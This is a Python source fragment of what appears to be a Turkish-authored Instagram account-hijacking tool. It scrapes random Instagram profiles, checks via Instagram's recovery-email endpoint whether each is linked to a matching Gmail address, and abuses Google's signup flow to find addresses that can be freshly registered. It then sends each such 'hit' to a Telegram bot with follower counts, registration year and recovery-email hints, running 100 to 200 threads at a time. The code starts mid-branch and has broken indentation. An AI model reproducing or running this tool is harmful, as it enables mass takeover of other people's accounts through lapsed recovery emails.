        ge = hits               
        bt = bad_insta + bad_email 
        be = good_ig  
        print(yellow + f"""\r
    {P1}Hits : {M}{ge} {W9}Bad Mail : {M}{bt}  {Z}Bad İnsta : {M}{be} @RusyaBaskan
    \r""")
    
    def update_stats():
        os.system('clear')
        pppp()
    
    def Rayq():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                rayqig["content_type_header"]: rayqig["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                rayqig["user_agent_header"]: str(generate_user_agent())
            }
            recovery_url = f"{rayqig['google_accounts_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
            res1 = requests.get(recovery_url, headers=headers)
            tok = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            ).group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                rayqig["authority_header"]: rayqig["google_accounts_domain"],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                rayqig["content_type_header"]: rayqig["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                rayqig["origin_header"]: rayqig["google_accounts_url"],
                rayqig["referrer_header"]: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
                rayqig["user_agent_header"]: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post(f"{rayqig['google_accounts_url']}/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            with open(rayqig["token_file"], 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(e)
            Rayq()
    
    Rayq()
    
    
    
    
    
    def check_gmail(email):
        global bad_email, hits
        try:
            if '@' in email:
                email = email.split('@')[0]
            with open(rayqig["token_file"], 'r') as f:
                token_data = f.read().splitlines()[0]
            tl, host = token_data.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                rayqig["authority_header"]: rayqig["google_accounts_domain"],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                rayqig["content_type_header"]: rayqig["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                rayqig["origin_header"]: rayqig["google_accounts_url"],
                rayqig["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                rayqig["user_agent_header"]: generate_user_agent()
            }
            params = {'TL': tl}
            data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                    f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                    "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                    "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                    "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                    "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
            response = pp(f"{rayqig['google_accounts_url']}/_/signup/usernameavailability",
                          params=params, cookies=cookies, headers=headers, data=data)
            if '"gf.uar",1' in response.text:
                hits += 1
                update_stats()
                full_email = email + rayqig["rayqdomain"]
                InfoAcc(email, full_email)
            else:
                bad_email += 1
                update_stats()
        except Exception:
            pass
    
    
    
    
    
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            rayqig["user_agent_header"]: ua,
            rayqig["cookie_header"]: rayqig["cookie_value"],
            rayqig["content_type_header"]: rayqig["content_type_form"]
        }
        data = {
            rayqig["signed_body"]: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                                         json.dumps({
                                             '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                                             'adid': uui,
                                             'guid': uui,
                                             'device_id': device_id,
                                             'query': email
                                         })),
            rayqig["ig_sig_key_version"]: '4'
        }
        response = requests.post(rayqig["instagram_recovery_url"], headers=headers, data=data).text
        if email in response:
            if rayqig["rayqdomain"] in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
    
    
    
    
    
    
    
    
    
    def rest(user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                rayqig["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                                  '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                                  'en_GB; 161478664)'),
                'Accept-Language': 'en-GB, en-US',
                rayqig["cookie_header"]: rayqig["cookie_value"],
                rayqig["content_type_header"]: rayqig["content_type_form"],
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356'
            }
            data = {
                rayqig["signed_body"]: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                                             '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                                             '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                                             '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                                             '"device_id":"android-b93ddb37e983481c",'
                                             '"query":"' + user + '"}'),
                rayqig["ig_sig_key_version"]: '4'
            }
            response = requests.post(rayqig["instagram_recovery_url"], headers=headers, data=data).json()
            rayqreset = response.get('email', 'h h h')
        except:
            rayqreset = 'h h h'
        return rayqreset
    
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk', 0)
        try:
            user_id_int = int(user_id)
        except:
            user_id_int = 0
    
        # Kayıt yılı tespiti
        if 900990001 <= user_id_int <= 1629010000:
            reg_date = 2013
            total_hits += 1  # SADECE 2013 için sayaç artır
        elif 1 < user_id_int <= 1278889:
            reg_date = 2010
        elif 1279000 <= user_id_int <= 17750000:
            reg_date = 2011
        elif 17750001 <= user_id_int <= 279760000:
            reg_date = 2012
        elif 279760001 <= user_id_int <= 900990000:
            reg_date = 2013  # BU alana düşmeyecek, çünkü ID aralığı dışı
        elif 1629010001 <= user_id_int <= 2369359761:
            reg_date = 2015
        elif 2369359762 <= user_id_int <= 4239516754:
            reg_date = 2016
        elif 4239516755 <= user_id_int <= 6345108209:
            reg_date = 2017
        elif 6345108210 <= user_id_int <= 10016232395:
            reg_date = 2018
        elif 10016232396 <= user_id_int <= 27238602159:
            reg_date = 2019
        elif 27238602160 <= user_id_int <= 43464475395:
            reg_date = 2020
        elif 43464475396 <= user_id_int <= 50289297647:
            reg_date = 2021
        elif 50289297648 <= user_id_int <= 57464707082:
            reg_date = 2022
        elif 57464707083 <= user_id_int <= 63313426938:
            reg_date = 2023
        else:
            reg_date = "2024 or 2025"
    
        full_name = account_info.get('full_name', '')
        followers = account_info.get('follower_count', '')
        following = account_info.get('following_count', '')
        
        tlg = f"""
    𝙃𝙞𝙩 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢
    ══════𝗥𝗔𝗬𝗤══════
    𝐇𝐢𝐭𝐬: {total_hits}
    𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}
    𝐌𝐚𝐢𝐥:  {username}@gmail.com
    𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬:  {followers} 
    𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠:  {following} 
    𝐃𝐚𝐭𝐞:  {reg_date}
    𝐁𝐢𝐨:  {account_info.get('biography','')}
    𝐑𝐞𝐬𝐭: {rest(username)}
    𝐋𝐢𝐧𝐤: 
     https://www.instagram.com/{username}
    ══════𝗥𝗔𝗬𝗤══════
    𝑩𝒀 @RusyaBaskan ~ @RayqTool
    """
        with open('Rayq2013.txt', 'a') as f:
            f.write(tlg + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except Exception:
            pass
    
    
    
    
    
    
    
    def rayqtool():
        session = requests.Session()
        while True:
            try:
                # Yalnızca 2013 user_id aralığı
                user_id = random.randint(279760001, 900990000)
                data = {
                    'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                    'variables': json.dumps({
                        'id': user_id,
                        'render_surface': 'PROFILE'
                    }),
                    'doc_id': '25618261841150840'
                }
                headers = {'X-FB-LSD': data['lsd']}
                response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    followers = account.get('follower_count', 0)
                    infoinsta[username] = account
                    email = username + rayqig["rayqdomain"]
                    check(email)
            except Exception:
                pass
    
    
    
    
    
    
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    
    
    
    
    
    Thread(target=stats_loop, daemon=True).start()
    
    
    
    
    
    for _ in range(200):
        Thread(target=rayqtool).start()
        
        
elif secim == "4":
    print(">>> Rayq Filtreli İnstagram çalışıyor...")
    
    import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init
import pyfiglet
import shutil
from time import sleep
import os
from colorama import Fore
from shutil import get_terminal_size

API_CONFIG = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ),
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "tl.txt",
    "durdurulmaz_domain": "@gmail.com"
}

E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
G = '\033[1;34m'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

session = requests.Session()






from colorama import Fore, init
import pyfiglet

init(autoreset=True)

ascii_art = pyfiglet.figlet_format("Instagram ", font="small")


print(f"{Fore.YELLOW}{ascii_art}")
print(f"{Fore.CYAN}Developed by @RusyaBaskan")
print("")

ID = input("- İD GİR: ")
TOKEN = input("- TOKEN GİR: ")
min_followers = int(input("- Minimum takipçi sayısını girin (ör. 100): "))

def pppp():
    ge = hits               
    bt = bad_insta + bad_email 
    be = good_ig
    os.system('cls' if os.name == 'nt' else 'clear')       
    print(f" \r{C1}Hıt: {M}{ge} {E} Bad: {HH}{bt} {W9}False: {HH}{M}{be}")

def update_stats():
    pppp()


def otuzbir():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["user_agent_header"]: str(generate_user_agent())
        }
        recovery_url = (f"{API_CONFIG['google_accounts_url']}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        if match:
            tok = match.group(2)
        else:
            raise Exception("Token bulunamadı")
        cookies = {'__Host-GAPS': host}
        headers2 = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: ('https://accounts.google.com/signup/v2/createaccount'
                                            '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{API_CONFIG['google_accounts_url']}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        with open(API_CONFIG["token_file"], 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(" hata:", e)
        otuzbir()


otuzbir()


def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(API_CONFIG["token_file"], 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{API_CONFIG['google_accounts_url']}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + API_CONFIG["durdurulmaz_domain"]
            InfoAcc(email, full_email.split('@')[1])
        else:
            bad_email += 1
            update_stats()
    except Exception as e:
        print("check_gmail hata:", e)
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        API_CONFIG["user_agent_header"]: ua,
        API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
        API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
    }
    data = {
        API_CONFIG["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        API_CONFIG["ig_sig_key_version"]: '4'
    }
    response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
    if email in response:
        if API_CONFIG["durdurulmaz_domain"] in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            API_CONFIG["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                              '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                              'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'h h h')
    except Exception as e:
        print("rest fonksiyonunda hata:", e)
        return 'h h h'

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 0)
    try:
        user_id_int = int(user_id)
    except:
        user_id_int = 0

    if 1 < user_id_int <= 1278889:
        reg_date = 2010
    elif 1279000 <= user_id_int <= 17750000:
        reg_date = 2011
    elif 17750001 <= user_id_int <= 279760000:
        reg_date = 2012
    elif 279760001 <= user_id_int <= 900990000:
        reg_date = 2013
    elif 900990001 <= user_id_int <= 1629010000:
        reg_date = 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        reg_date = 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        reg_date = 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        reg_date = 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        reg_date = 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        reg_date = 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        reg_date = 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        reg_date = 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        reg_date = 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        reg_date = 2023
    else:
        reg_date = "2024 or 2025"

    followers = account_info.get('follower_count', 0)
    try:
        followers = int(followers)
    except:
        followers = 0
    
    # Sadece minimum takipçi filtresi
    if followers < min_followers:
        return

    try:
        is_business_api = account_info.get('is_business', False)
        acct_type = str(account_info.get('account_type', ''))
        is_business = bool(is_business_api) or (acct_type.upper() == 'BUSINESS')
    except Exception as e:
        is_business = False
        print("Business flag parse error: {e}")

    meta_status = "Meta Aktif ✅ " if followers > 99 else "Aktif Deği𝗅 ❌"
    
    following = account_info.get('following_count', '')
    total_hits += 1
    info_text = f"""
𝙃𝙞𝙩 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢
══════𝗥𝗔𝗬𝗤══════
𝐇𝐢𝐭𝐬: {total_hits}
𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}
𝐌𝐚𝐢𝐥: {username}@{domain}
𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬: {followers}
𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠: {following}
𝐌𝐞𝐭𝐚: {meta_status}
𝐁𝐮𝐬𝐢𝐧𝐞𝐬𝐬: {is_business}
𝐃𝐚𝐭𝐞: {reg_date}
𝐁𝐢𝐨: {account_info.get('biography','')}
𝐑𝐞𝐬𝐭: {rest(username)}
𝐋𝐢𝐧𝐤: 
 https://www.instagram.com/{username}
══════𝗥𝗔𝗬𝗤══════
 𝑩𝒀 ~ @RusyaBaskan ~ @RayqChannel
 
"""
    with open('RayqHit.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception as e:
        print("Telegram mesajı gönderilemedi:", e)

def durdurulmaz_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(1629010000, 2500000000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                # Sadece minimum takipçi filtresi
                if followers < min_followers:
                    continue
                infoinsta[username] = account
                email = username + API_CONFIG["durdurulmaz_domain"]
                check(email)
        except Exception as e:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()

for _ in range(100):
    Thread(target=durdurulmaz_python).start()
        
      
          
     
else:
    print("Geçersiz seçim yaptınız.")
